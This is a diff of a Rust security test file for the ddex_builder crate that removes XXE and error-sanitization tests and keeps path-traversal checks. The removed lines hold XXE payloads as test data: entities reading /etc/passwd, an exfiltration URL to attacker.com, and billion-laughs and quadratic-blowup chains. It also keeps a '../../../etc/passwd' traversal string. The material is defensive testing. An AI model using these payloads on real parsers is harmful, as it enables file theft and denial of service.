@@ -1,16 +1,8 @@
-//! Comprehensive Security Fixes Integration Test
-//!
-//! This test verifies that all security improvements work together correctly:
-//! - Path validation prevents traversal attacks
-//! - Entity classification blocks XXE attacks
-//! - Error sanitization prevents information disclosure
-//! - Cross-platform compatibility
+//! Path validation security tests: traversal attacks and cross-platform paths.
+//! (The entity-classification and error-sanitization tests were removed with those helpers
+//! in 0.6.0.)
 
-use ddex_builder::security::{
-    create_entity, create_external_entity, create_parameter_entity, EntityClassifier, ErrorContext,
-    ErrorMode, ErrorSanitizer, PathValidator, SanitizerConfig,
-};
-use std::io::{Error, ErrorKind};
+use ddex_builder::security::PathValidator;
 
 /// Test suite for comprehensive security integration
 #[cfg(test)]
@@ -85,172 +77,6 @@ mod security_integration_tests {
     }
 
     #[test]
-    fn test_entity_classification_xxe_defense() {
-        println!("🛡️  Testing entity classification XXE defense...");
-
-        let mut classifier = EntityClassifier::new();
-
-        // Test all known XXE attack payloads
-        let xxe_payloads = vec![
-            // Basic external entity attacks
-            create_external_entity("xxe", "file:///etc/passwd"),
-            create_external_entity("xxe", "http://attacker.com/evil.dtd"),
-            create_external_entity("xxe", "ftp://evil.com/exfiltrate"),
-            create_external_entity("xxe", "jar:http://evil.com/evil.jar!/"),
-            // Parameter entity attacks
-            create_parameter_entity("file", "file:///etc/passwd"),
-            create_parameter_entity("dtd", "http://attacker.com/evil.dtd"),
-            create_parameter_entity("exfil", "http://attacker.com/exfil?data=%file;"),
-            // Billion laughs variants
-            create_entity(
-                "lol",
-                "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;",
-            ),
-            create_entity(
-                "lol2",
-                "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;",
-            ),
-            create_entity(
-                "lol3",
-                "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;",
-            ),
-            create_entity(
-                "lol4",
-                "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;",
-            ),
-            create_entity("lol5", "LOL"),
-            // Quadratic blowup attacks
-            create_entity("a", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"), // 32 a's
-            create_entity("b", "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"), // 16 references = 512 a's
-            create_entity("c", "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"), // 16 references = 8192 a's
-        ];
-
-        // All these should be detected as malicious or trigger validation errors
-        for entity in xxe_payloads {
-            let entities = vec![entity];
-            let result = classifier.validate_entity_chain(&entities);
-
-            assert!(
-                !result.is_safe,
-                "XXE payload with entity '{}' should be blocked",
-                entities[0].name
-            );
-            assert!(
-                !result.errors.is_empty(),
-                "XXE payload with entity '{}' should have errors",
-                entities[0].name
-            );
-        }
-
-        // Test safe DDEX entities still work
-        let safe_entities = vec![
-            create_entity("title", "Song Title"),
-            create_entity("artist", "Artist Name"),
-            create_entity("isrc", "USRC17607839"),
-            create_entity("duration", "PT3M45S"),
-        ];
-
-        let result = classifier.validate_entity_chain(&safe_entities);
-        assert!(result.is_safe, "Safe DDEX entities should be allowed");
-        assert!(
-            result.errors.is_empty(),
-            "Safe DDEX entities should have no errors"
-        );
-
-        println!("✅ Entity classification XXE defense test passed");
-    }
-
-    #[test]
-    fn test_error_sanitization_no_leakage() {
-        println!("🛡️  Testing error sanitization prevents information leakage...");
-
-        let config = SanitizerConfig {
-            mode: ErrorMode::Production,
-            generate_correlation_ids: true,
-            log_internal_details: false, // Don't spam test logs
-            max_message_length: 200,
-            include_error_codes: true,
-        };
-
-        let mut sanitizer = ErrorSanitizer::with_config(config);
-
-        // Test sensitive information that should be redacted
-        let sensitive_errors = vec![
-            (
-                "File path leakage",
-                Error::new(ErrorKind::PermissionDenied, "Cannot access /home/admin/secrets.txt containing API keys"),
-                ErrorContext::FileRead,
-                vec!["/home/admin", "secrets.txt", "API keys"],
-            ),
-            (
-                "Network information leakage", 
-                Error::new(ErrorKind::ConnectionRefused, "Connection failed to 192.168.1.100:8080 (internal server)"),
-                ErrorContext::NetworkRequest,
-                vec!["192.168.1.100", "8080", "internal server"],
-            ),
-            (
-                "Memory address leakage",
-                Error::new(ErrorKind::Other, "Segmentation fault at address 0x7fff5fbff000 in function parse_xml()"),
-                ErrorContext::XmlParsing,
-                vec!["0x7fff5fbff000", "parse_xml"],
-            ),
-            (
-                "Database connection leakage",
-                Error::new(ErrorKind::ConnectionRefused, "Failed to connect to postgres://admin:FAKE_PASSWORD_123@db.internal.com:5432/prod"),
-                ErrorContext::DatabaseConnection,
-                vec!["admin", "FAKE_PASSWORD_123", "db.internal.com", "5432", "prod"],
-            ),
-            (
-                "API key leakage",
-                Error::new(ErrorKind::PermissionDenied, "Authentication failed: api_key=FAKE_API_KEY_FOR_TESTING_ONLY"),
-                ErrorContext::Authentication,
-                vec!["FAKE_API_KEY_FOR_TESTING_ONLY"],
-            ),
-        ];
-
-        for (test_name, error, context, sensitive_strings) in sensitive_errors {
-            let sanitized = sanitizer.sanitize(error, context);
-
-            // Verify no sensitive information leaked
-            for sensitive_string in sensitive_strings {
-                assert!(
-                    !sanitized.message.contains(sensitive_string),
-                    "{}: Message should not contain '{}' but got: '{}'",
-                    test_name,
-                    sensitive_string,
-                    sanitized.message
-                );
-                assert!(
-                    !sanitized.to_string().contains(sensitive_string),
-                    "{}: Full output should not contain '{}' but got: '{}'",
-                    test_name,
-                    sensitive_string,
-                    sanitized.to_string()
-                );
-            }
-
-            // Verify useful information is still present
-            assert!(
-                !sanitized.correlation_id.is_empty(),
-                "{}: Should have correlation ID",
-                test_name
-            );
-            assert!(
-                sanitized.code.is_some(),
-                "{}: Should have error code",
-                test_name
-            );
-            assert!(
-                !sanitized.message.is_empty(),
-                "{}: Should have non-empty message",
-                test_name
-            );
-        }
-
-        println!("✅ Error sanitization no leakage test passed");
-    }
-
-    #[test]
     #[ignore = "known bug: PathValidator allows Unicode-homograph and other platform attack paths"]
     fn test_cross_platform_path_validation() {
         println!("🛡️  Testing cross-platform path validation...");
@@ -302,74 +128,12 @@ mod security_integration_tests {
     fn test_integrated_security_workflow() {
         println!("🔒 Testing integrated security workflow...");
 
-        // Simulate a complete workflow with all security components
         let path_validator = PathValidator::new();
-        let mut entity_classifier = EntityClassifier::new();
-        let mut error_sanitizer = ErrorSanitizer::with_config(SanitizerConfig {
-            mode: ErrorMode::Production,
-            ..SanitizerConfig::default()
-        });
 
-        // Step 1: Validate file path (should fail)
+        // Validate file path (should fail)
         let malicious_path = "../../../etc/passwd";
         let path_result = path_validator.validate(malicious_path);
         assert!(path_result.is_err(), "Malicious path should be blocked");
-
-        // Step 2: If path validation failed, sanitize the error
-        let path_error = Error::new(
-            ErrorKind::PermissionDenied,
-            format!(
-                "Path validation failed for {}: {:?}",
-                malicious_path,
-                path_result.err()
-            ),
-        );
-        let sanitized_path_error = error_sanitizer.sanitize_security_error(path_error);
-
-        // Verify no path information leaked
-        assert!(
-            !sanitized_path_error.to_string().contains("etc/passwd"),
-            "Sanitized path error should not contain sensitive path"
-        );
-
-        // Step 3: Validate XML entities (should fail)
-        let malicious_entities = vec![
-            create_external_entity("xxe", "file:///etc/passwd"),
-            create_entity("bomb", "&bomb;&bomb;&bomb;&bomb;"),
-        ];
-        let entity_result = entity_classifier.validate_entity_chain(&malicious_entities);
-        assert!(
-            !entity_result.is_safe,
-            "Malicious entities should be blocked"
-        );
-
-        // Step 4: If entity validation failed, sanitize the error
-        let entity_error = Error::new(
-            ErrorKind::InvalidData,
-            format!(
-                "Entity validation failed: {}",
-                entity_result.errors.join(", ")
-            ),
-        );
-        let sanitized_entity_error = error_sanitizer.sanitize_security_error(entity_error);
-
-        // Verify no entity details leaked
-        assert!(
-            !sanitized_entity_error
-                .to_string()
-                .contains("file:///etc/passwd"),
-            "Sanitized entity error should not contain sensitive entity reference"
-        );
-
-        // Step 5: Verify all errors have correlation IDs for internal debugging
-        assert!(
-            !sanitized_path_error.correlation_id.is_empty(),
-            "Path error should have correlation ID"
-        );
-        assert!(
-            !sanitized_entity_error.correlation_id.is_empty(),
-            "Entity error should have correlation ID"
-        );
 
         println!("✅ Integrated security workflow test passed");
     }
@@ -405,56 +169,8 @@ mod security_integration_tests {
             "Unicode normalization attack should be blocked"
         );
 
-        // Test deeply nested entity chains
-        let mut classifier = EntityClassifier::new();
-        let mut deep_entities = Vec::new();
-        for i in 0..100 {
-            if i == 99 {
-                deep_entities.push(create_entity(&format!("level{}", i), "deep"));
-            } else {
-                deep_entities.push(create_entity(
-                    &format!("level{}", i),
-                    &format!("&level{};", i + 1),
-                ));
-            }
-        }
-
-        let deep_result = classifier.validate_entity_chain(&deep_entities);
-        assert!(
-            !deep_result.is_safe,
-            "Deeply nested entities should be blocked"
-        );
-
         println!("✅ Security edge cases test passed");
     }
-}
-
-/// Integration test for memory safety and resource cleanup
-#[test]
-fn test_security_memory_safety() {
-    println!("🧠 Testing memory safety and resource cleanup...");
-
-    // Test that security components don't leak memory under stress
-    let mut sanitizer = ErrorSanitizer::new();
-    let mut classifier = EntityClassifier::new();
-
-    // Generate many errors and entities to test resource cleanup
-    for i in 0..1000 {
-        // Test error sanitization doesn't accumulate memory
-        let error = Error::new(ErrorKind::Other, format!("Test error {}", i));
-        let _ = sanitizer.sanitize_io_error(error, ErrorContext::FileRead);
-
-        // Test entity classification doesn't accumulate memory
-        let entity = create_entity(&format!("test{}", i), &format!("value{}", i));
-        let _ = classifier.validate_entity_chain(&vec![entity]);
-
-        // Periodically clear caches to simulate real usage
-        if i % 100 == 0 {
-            sanitizer.clear_error_store();
-        }
-    }
-
-    println!("✅ Memory safety test passed");
 }
 
 /// Test that all security components work correctly under concurrent access
@@ -471,28 +187,10 @@ async fn test_security_concurrent_access() {
             task::spawn(async move {
                 // Each task tests all security components
                 let validator = PathValidator::new();
-                let mut classifier = EntityClassifier::new();
-                let mut sanitizer = ErrorSanitizer::new();
 
                 // Test concurrent path validation
                 let path_result = validator.validate(&format!("test/path/{}.xml", i));
                 assert!(path_result.is_ok(), "Valid path should pass validation");
-
-                // Test concurrent entity classification
-                let entity = create_entity(&format!("test{}", i), &format!("value{}", i));
-                let entity_result = classifier.validate_entity_chain(&vec![entity]);
-                assert!(
-                    entity_result.is_safe,
-                    "Valid entity should pass classification"
-                );
-
-                // Test concurrent error sanitization
-                let error = Error::new(ErrorKind::Other, format!("Test error {}", i));
-                let sanitized = sanitizer.sanitize_io_error(error, ErrorContext::FileRead);
-                assert!(
-                    !sanitized.correlation_id.is_empty(),
-                    "Should have correlation ID"
-                );
 
                 i
             })
@@ -514,8 +212,6 @@ fn test_security_malformed_input_handling() {
     println!("💥 Testing malformed input handling...");
 
     let validator = PathValidator::new();
-    let mut classifier = EntityClassifier::new();
-    let mut sanitizer = ErrorSanitizer::new();
 
     // Test path validator with malformed inputs
     let bom_string = "\u{FEFF}".repeat(100);
@@ -530,48 +226,6 @@ fn test_security_malformed_input_handling() {
         let result = validator.validate(path);
         // Should not panic, should handle gracefully
         assert!(result.is_err(), "Malformed path should be rejected");
-    }
-
-    // Test entity classifier with malformed entities
-    let malformed_entities = vec![
-        create_entity("", ""),                      // Empty
-        create_entity("\0", "value"),               // Null in name
-        create_entity("name", "\0"),                // Null in value
-        create_entity(&"A".repeat(10000), "value"), // Very long name
-        create_entity("name", &"A".repeat(100000)), // Very long value
-    ];
-
-    for entity in malformed_entities {
-        let result = classifier.validate_entity_chain(&vec![entity]);
-        // Should not panic, should handle gracefully
-        // (May be safe or unsafe depending on content, but shouldn't crash)
-        assert!(
-            !result.errors.is_empty() || result.is_safe,
-            "Should either have errors or be safe, not crash"
-        );
-    }
-
-    // Test error sanitizer with malformed errors
-    let long_message_string = "A".repeat(100000);
-    let malformed_error_messages = vec![
-        "",                   // Empty
-        "\0\0\0",             // Null bytes
-        "\x01\x02\x03",       // Control characters
-        &long_message_string, // Very long message
-    ];
-
-    for msg in malformed_error_messages {
-        let error = Error::new(ErrorKind::Other, msg);
-        let sanitized = sanitizer.sanitize_io_error(error, ErrorContext::FileRead);
-        // Should not panic, should produce valid sanitized error
-        assert!(
-            !sanitized.correlation_id.is_empty(),
-            "Should have correlation ID"
-        );
-        assert!(
-            !sanitized.message.is_empty(),
-            "Should have non-empty message"
-        );
     }
 
     println!("✅ Malformed input handling test passed");
